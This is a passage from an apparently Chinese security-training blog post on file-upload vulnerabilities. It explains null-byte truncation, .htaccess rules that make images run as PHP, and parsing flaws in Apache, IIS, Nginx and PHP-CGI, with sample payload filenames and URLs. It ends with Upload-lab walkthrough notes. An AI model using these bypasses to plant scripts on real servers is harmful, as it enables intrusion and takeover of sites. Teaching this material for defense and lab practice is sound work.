<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">例如：url中暴露了文件保存路径 &#x2F;Pass-11&#x2F;index.php?save_path&#x3D;..&#x2F;upload&#x2F;</span><br><span class="line">服务器后台会对上传的文件进行随机命名，最后进行路径拼接存储文件，..&#x2F;upload&#x2F; + 712371751824.gif</span><br><span class="line">为了使上传的图片文件可以作为php脚本执行，我们可以再文件保存路径处构造一个php文件名充当保存路径，然后加一个%00截断后面的真实文件名，此时，路径拼接就构造成了：..&#x2F;upload&#x2F;test.php%00&#x2F;712371751824.gif。由于PHP是由C语言开发的，字符串的结束标志和C语言一样都是ASCII码为0的空字符，因此字符串类型的文件存储路径遇到%00就会被截断，后面的路径字符串不会被处理，成功的将文件上传为了..&#x2F;upload&#x2F;test.php</span><br></pre></td></tr></table></figure>

<h4 id="6、配置文件上传漏洞——-htaccess文件攻击"><a href="#6、配置文件上传漏洞——-htaccess文件攻击" class="headerlink" title="6、配置文件上传漏洞——.htaccess文件攻击"></a>6、配置文件上传漏洞——.htaccess文件攻击</h4><p><strong>①Apache配置文件设置：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &quot;网页根目录&quot;&gt;下的 AllowOverride All</span><br><span class="line">LoadModule rewrite_module &#x2F;usr&#x2F;lib&#x2F;apache2&#x2F;modules&#x2F;mod_rewrite.so</span><br></pre></td></tr></table></figure>

<p><strong>②漏洞原理</strong>：.htaccess文件是Apache的分布式配置文件，它会重写文件所在路径以及该路径下的所有子文件夹的Apache全局配置。</p>
<p><strong>③攻击案例：</strong></p>
<p>​    将.png文件当作PHP文件解析</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .png</span><br><span class="line">AddHandler php5-script .png</span><br></pre></td></tr></table></figure>
<p>​    将所有文件当作PHP文件解析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure>

<p>​    规定匹配文件名的文件当作PHP文件解析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;zjcfilename&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>​    <strong>实践，phpstudy，根据vhost配置文件的分析得出结果</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddHandler fcgid-script .png</span><br><span class="line">FcgidWrapper &quot;D:&#x2F;phpstudy_pro&#x2F;Extensions&#x2F;php&#x2F;php5.2.17nts&#x2F;php-cgi.exe&quot; .png</span><br></pre></td></tr></table></figure>

<p><strong>④注意事项</strong></p>
<p>​    Windows中创建.htaccess文件时，认为它是一个没有文件名的htaccess格式的文件，我们需要创建一个新文件，将其另存为*.*文件格式的文件，就不会报错。</p>
<p><strong>⑤</strong>LUA脚本上传</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler lua-script .lua</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">木马详见2020杭州西湖论剑CTF，NewUpload</span><br></pre></td></tr></table></figure>

<h4 id="7、Web容器解析漏洞"><a href="#7、Web容器解析漏洞" class="headerlink" title="7、Web容器解析漏洞"></a>7、Web容器解析漏洞</h4><blockquote>
<p>Nginx服务漏洞详解：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/136801555">https://zhuanlan.zhihu.com/p/136801555</a></p>
<p>Apache中间件漏洞详解：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/125115734">https://zhuanlan.zhihu.com/p/125115734</a></p>
</blockquote>
<h5 id="①Apache解析漏洞（1-x-2-x漏洞）"><a href="#①Apache解析漏洞（1-x-2-x漏洞）" class="headerlink" title="①Apache解析漏洞（1.x 2.x漏洞）"></a>①Apache解析漏洞（1.x 2.x漏洞）</h5><p>其实这属于Apache早期版本的特性，Apache识别文件类型是从右向左，直到识别写在mime.types配置文件中一个它认识的文件名后缀进行解析。因此，有些黑名单通过这个漏洞就可以绕过，payload:<code>hack.php.xxx</code></p>
<h5 id="②IIS6-0解析漏洞"><a href="#②IIS6-0解析漏洞" class="headerlink" title="②IIS6.0解析漏洞"></a>②IIS6.0解析漏洞</h5><p>​    1 - payload：<code>hack.asp;test.jpg</code>；</p>
<p>​    2 - <code>hack.asp/test.jpg</code>(文件后缀名为asp下的所有文件当作asp执行，此漏洞需要结合上传文件夹来利用)</p>
<h5 id="③Nginx解析漏洞"><a href="#③Nginx解析漏洞" class="headerlink" title="③Nginx解析漏洞"></a>③Nginx解析漏洞</h5><p>（1）0.8.37以下的版本，可以上传一个不被过滤后缀名的木马，如：shell.jpg，可以通过请求shell.jpg.php来进行正常解析</p>
<p>（2）空字节漏洞：（0.5.<em>, 0.6.</em>, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37）</p>
<p>​    <code>Payload：http://www.xx.com/hack.png%00.php</code>，当nginx发现访问文件后缀名为.php时，会交给php-cgi进行解析，php-cgi读该文件名字符串发现%00时会停止读取（C语言字符串结束空字符%00），因此会将hack.png作为php文件执行</p>
<p>（3）文件名逻辑漏洞/CVE-2013-4547(0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7)：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Blood_Pupil/article/details/88565176">https://blog.csdn.net/Blood_Pupil/article/details/88565176</a></p>
<p>​    <code>Payload：http://www.xx.com/hack.png%20%00.php</code>，此漏洞是空字节漏洞后发现的漏洞，修复空字节漏洞后只通过%00截断路径，nginx会返回错误页面，这是逻辑漏洞逻辑之一。另外，nginx发现%20也就是空格时，会进入一个switch语句中的default，继续解析剩下的url，这是逻辑漏洞逻辑之二。因此，当%20和%00挨在一起时就会产生正常解析的逻辑漏洞，将此.png文件作为php文件解析。</p>
<h5 id="④PHP-CGI解析漏洞"><a href="#④PHP-CGI解析漏洞" class="headerlink" title="④PHP CGI解析漏洞"></a>④PHP CGI解析漏洞</h5><blockquote>
<p>漏洞主要配置原因是php.ini中的：cgi.fix_pathinfo=1    =0时无此漏洞</p>
</blockquote>
<p>​    1 - IIS7.0 / 7.5 + PHP环境：<code>hack.png/.php</code>    #上传hack.png访问时url加上/X.php就会当作php脚本运行将png中的php代码解析</p>
<blockquote>
<ul>
<li>配置IIS支持PHP解析：IIS -&gt; 处理程序映射 -&gt; 添加模块映射 -&gt; 请求路径 *.php; 模块:FastCgiModule; 可执行文件：PHP路径下的php-cgi.exe; 名称随便例如Fast-CGI-PHP</li>
<li>把php配置文件联系到IIS中：FastCGI设置 -&gt; 编辑 -&gt; 监视对文件所做的更改 -&gt; 选择PHP配置文件php.ini</li>
<li>补丁方法：处理程序映射 -&gt; 编辑对应的php映射 -&gt; 请求限制 -&gt; 映射中勾选仅当请求映射至一下内容时…. -&gt; 确定</li>
</ul>
</blockquote>
<p>​    2 - Nginx解析漏洞</p>
<p>​    上传1.jpg，访问时url加上/X.php就会当作php脚本运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;1.jpg&#x2F;1.php</span><br></pre></td></tr></table></figure>

<h4 id="8、一些在线编辑器的文件上传漏洞"><a href="#8、一些在线编辑器的文件上传漏洞" class="headerlink" title="8、一些在线编辑器的文件上传漏洞"></a>8、一些在线编辑器的文件上传漏洞</h4><h5 id="①ewebeditor"><a href="#①ewebeditor" class="headerlink" title="①ewebeditor"></a>①ewebeditor</h5><h5 id="②fckeditor"><a href="#②fckeditor" class="headerlink" title="②fckeditor"></a>②fckeditor</h5><h4 id="9、一些常见CMS的文件上传漏洞"><a href="#9、一些常见CMS的文件上传漏洞" class="headerlink" title="9、一些常见CMS的文件上传漏洞"></a>9、一些常见CMS的文件上传漏洞</h4><p>CMS：快速建站的框架，一些常见的CMS就有文件上传漏洞。</p>
<h4 id="10、-DATA文件流绕过"><a href="#10、-DATA文件流绕过" class="headerlink" title="10、::$DATA文件流绕过"></a>10、::$DATA文件流绕过</h4><p>在Windows系统的NTFS文件系统下，可使用::$DATA绕过黑名单限制。</p>
<h4 id="11、后缀名-空格上传"><a href="#11、后缀名-空格上传" class="headerlink" title="11、后缀名+空格上传"></a>11、后缀名+空格上传</h4><p>有些情况，服务器没有对多余的空格进行处理，导致得到了后缀名为.php空格，可能会绕过某些黑名单的判断。而操作系统可能不会处理名字末尾带有的空格。</p>
<h4 id="12、后缀名-点上传"><a href="#12、后缀名-点上传" class="headerlink" title="12、后缀名+点上传"></a>12、后缀名+点上传</h4><p>Windows系统下，当文件后缀末尾有.的时候，Windows会自动的去除这些点，可绕过服务端的检测。</p>
<h3 id="五、文件上传靶场——Upload-lab"><a href="#五、文件上传靶场——Upload-lab" class="headerlink" title="五、文件上传靶场——Upload-lab"></a>五、文件上传靶场——Upload-lab</h3><h4 id="PASS-01：文件检测依赖前端JS代码"><a href="#PASS-01：文件检测依赖前端JS代码" class="headerlink" title="PASS-01：文件检测依赖前端JS代码"></a>PASS-01：文件检测依赖前端JS代码</h4><p>方法1、前端上传图片时，触发了表单的检查输入文件名的事件，将JS删除即可上传文件，最后通过返回的图片，右键查看图片地址，即可了解上传的文件在服务器的位置。触发xm即可。</p>
<p>方法2、构造xm使其符合js的要求，过掉js后，通过BP代理改掉文件后缀filename。</p>
<h4 id="PASS-02：文件检测依赖于MIME类型"><a href="#PASS-02：文件检测依赖于MIME类型" class="headerlink" title="PASS-02：文件检测依赖于MIME类型"></a>PASS-02：文件检测依赖于MIME类型</h4><p>可通过BP抓包，修改Content-Type类型，使其合法。</p>
<h4 id="PASS-04：配置文件上传漏洞——-htaccess"><a href="#PASS-04：配置文件上传漏洞——-htaccess" class="headerlink" title="PASS-04：配置文件上传漏洞——.htaccess"></a>PASS-04：配置文件上传漏洞——.htaccess</h4><h4 id="PASS-11：00截断"><a href="#PASS-11：00截断" class="headerlink" title="PASS-11：00截断"></a>PASS-11：00截断</h4><h4 id="PASS-14：文件检测依赖于getimagesize-函数"><a href="#PASS-14：文件检测依赖于getimagesize-函数" class="headerlink" title="PASS-14：文件检测依赖于getimagesize()函数"></a>PASS-14：文件检测依赖于getimagesize()函数</h4><p>多种图片马方法绕过，</p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4>
                
<p class="pink-link-context">
    <a href="/2020/08/06/Leetcode/63%E3%80%81%E4%B8%8D%E5%90%8C%E8%B7%AF%E5%BE%84/" rel="next" title="63-不同路径">
    上一篇：63-不同路径
  </a>
</p>



<p class="pink-link-context">
    <a href="/2020/08/05/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/7%E3%80%81SQL%E6%B3%A8%E5%85%A5/" rel="next" title="SQL注入漏洞">
    下一篇：SQL注入漏洞
  </a>
</p>


            </div>
			
        </div>
    </div>
</article>






</div>

        <div class="fixed-action-btn float-sitemap">
    <a class="btn-floating btn-large pink">
      <i class="fa fa-caret-square-o-up"></i>
    </a>
    <ul>
      <li><a class="btn-return-top btn-floating waves-effect green" title="回到顶部"><i class="fa fa-arrow-circle-o-up"></i></a></li>
      <li><a class="btn-floating waves-effect button-collapse yellow darken-1"  data-activates="main-menu" title="菜单"><i class="fa fa-navicon"></i></a></li>
    </ul>
  </div>

    </main>
    <footer class="page-footer indigo darken-1">
    
    <div class="footer-container container">
        <div class="row">
            
            <div class="social-group col m4 s12">
                <h5 class="white-text">社交</h5>
                
                    <a class="social-link" href="http://weibo.com/1956184117" target="_blank">
                        <i class="fa fa-2x fa-weibo"></i>
                    </a>
                
                    <a class="social-link" href="https://github.com/raytaylorlin" target="_blank">
                        <i class="fa fa-2x fa-github"></i>
                    </a>
                
                    <a class="social-link" href="/atom.xml" target="_blank">
                        <i class="fa fa-2x fa-rss"></i>
                    </a>
                
                

            </div>
            

            
            <div class="col m8 s12">
                <h5 class="white-text">友情链接</h5>
                
                    <a class="social-link" href="http://raytaylorlin.com/" target="_blank">raytaylorism主题作者的技术博客</a>
                
                    <a class="social-link" href="https://github.com/raytaylorlin" target="_blank">Github地址（测试友情链接）</a>
                
            </div>
            
        </div>
    </div>
    

    <div class="footer-copyright pink-link-context">
        <div class="container">
            © 2016 example.com, All rights reserved.
            <p class="right" style="margin-top: 0;">本博客由 <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> 强力驱动 | 主题 <a target="_blank" rel="noopener" href="https://github.com/raytaylorlin/hexo-theme-raytaylorism">raytaylorism</a></p>
        </div>
    </div>
</footer>


    <noscript>
    <div class="noscript">
        <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
    </div>
</noscript>
<div class="noscript">
    <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
</div>


<script src="/js/jquery.min.js"></script>
<script src="/js/materialize.min.js"></script>

<script>
    (function($) {
        $(document).ready(function() {
            // 隐藏禁用javascript（针对微信内置浏览器）的提示
            $('.noscript').hide();

            // 图片缩放效果
            var $imgs = $('img').not('.slider-image').not('.avatar-image').not('.carousel-image').not('.card-cover-image').not('.qrcode');

            // 给图片加上点击放大效果（materialbox插件）
            $imgs.addClass('materialboxed').each(function(i, el) {
                $(this).attr('data-caption', $(this).attr('alt') || ' ');
            }).materialbox();

            // 优化表格的显示
            $('table').each(function() {
                var $table = $(this);
                // 除去多行代码的情况
                if ($table.find('pre').length == 0) {
                    $table.addClass('responsive-table striped bordered');
                }
            });

            // 首页幻灯片
            $('.slider').slider({indicators: true, full_width: true, interval: 8000});

            $(".button-collapse").sideNav();
            $(".category-menu").sideNav();

            // 针对gallery post
            $('.carousel').carousel({full_width: true});
            $('.carousel-control.prev').click(function() {
                $('.carousel').carousel('prev');
            });
            $('.carousel-control.next').click(function() {
                $('.carousel').carousel('next');
            });

            // 文章目录
            $('article').not('.simple-article').find('h1').add('h2').add('h3').add('h4').add('h5').add('h6').scrollSpy();

            // 目录随屏幕滚动（防止目录过长越过footer）
            var $toc = $('.toc');
            var scrollTargetTop = 0;
            $(window).scroll(function() {
                var $activeLink = $toc.find('a.active.section');
                if ($(window).scrollTop() < 100) {
                    scrollTargetTop = 0;
                } else {
                    if ($activeLink[0]) {
                        scrollTargetTop = $activeLink.offset().top - $toc.offset().top;
                    }
                }
                $toc.css('top', '-' + scrollTargetTop + 'px');
            });

            // 修正文章目录的left-border颜色
            var color = $('.table-of-contents-text').css('color');
            $('.table-of-contents-link').css('border-left-color', color);

            // 针对移动端做的优化：FAB按钮点击一下收回
            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
                $('.fixed-action-btn').addClass('click-to-toggle');
            }
            // 回到顶部
            $('.btn-return-top').click(function() {
                $('body, html').animate({
                    scrollTop: 0
                }, 500);
            });

            // 重置读书页面的Tab标签页的颜色
            $('li.tab a').hover(function() {
                $(this).toggleClass('text-lighten-4');
            });
            $('.indicator').addClass('pink lighten-2');

            
            // 添加new标签
            $('').append('<span class="new badge pink"></span>');
            

            // 搜索功能
            $('.modal-trigger').leanModal({
                // 打开搜索框时自动聚焦
                ready: function() {
                    if ($('#search').is(":visible")) {
                        $('#search-input').focus();
                    }
                }
            });
            var searchXml = "search.xml";
            if (searchXml.length == 0) {
             	searchXml = "search.xml";
            }
            var searchPath = "/" + searchXml;
            initSearch(searchPath, 'search-input', 'search-result');
        });

        // 初始化搜索与匹配函数
        var initSearch = function(path, search_id, content_id) {
            'use strict';
            $.ajax({
                url: path,
                dataType: "xml",
                success: function(xmlResponse) {
                    // get the contents from search data
                    var datas = $("entry", xmlResponse).map(function() {
                        return {
                            title: $("title", this).text(),
                            content: $("content", this).text(),
                            url: $("url", this).text()
                        };
                    }).get();
                    var $input = document.getElementById(search_id);
                    var $resultContent = document.getElementById(content_id);
                    $input.addEventListener('input', function() {
                        var str = '<ul class=\"search-result-list\">';
                        var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                        $resultContent.innerHTML = "";
                        if (this.value.trim().length <= 0) {
                            return;
                        }
                        // perform local searching
                        datas.forEach(function(data) {
                            var isMatch = true;
                            var content_index = [];
                            var data_title = data.title.trim().toLowerCase();
                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                            var data_url = data.url;
                            var index_title = -1;
                            var index_content = -1;
                            var first_occur = -1;
                            // only match artiles with not empty titles and contents
                            if (data_title != '' && data_content != '') {
                                keywords.forEach(function(keyword, i) {
                                    index_title = data_title.indexOf(keyword);
                                    index_content = data_content.indexOf(keyword);
                                    if (index_title < 0 && index_content < 0) {
                                        isMatch = false;
                                    } else {
                                        if (index_content < 0) {
                                            index_content = 0;
                                        }
                                        if (i == 0) {
                                            first_occur = index_content;
                                        }
                                    }
                                });
                            }
                            // show search results
                            if (isMatch) {
                                keywords.forEach(function(keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    data_title = data_title.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
                                });

                                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                                var content = data.content.trim().replace(/<[^>]+>/g, "");
                                if (first_occur >= 0) {
                                    // cut out 100 characters
                                    var start = first_occur - 20;
                                    var end = first_occur + 80;
                                    if (start < 0) {
                                        start = 0;
                                    }
                                    if (start == 0) {
                                        end = 100;
                                    }
                                    if (end > content.length) {
                                        end = content.length;
                                    }
                                    var match_content = content.substring(start, end);
                                    // highlight all keywords
                                    keywords.forEach(function(keyword) {
                                        var regS = new RegExp(keyword, "gi");
                                        match_content = match_content.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
                                    });

                                    str += "<p class=\"search-result\">..." + match_content + "...</p>"
                                }
                                str += "</li>";
                            }
                        });
                        str += "</ul>";
                        $resultContent.innerHTML = str;
                    });
                }
            });
        }
    })(jQuery);
</script>


<script src="/js/prettify.js"></script>
<script type="text/javascript">
    $(document).ready(function() {
        $("pre").addClass("prettyprint");
        prettyPrint();
    });
</script>






<script type="text/x-mathjax-config">
MathJax.Hub.Config({
  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
});
</script>
<script type="text/javascript" async
  src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML">
</script>



</body>
</html>
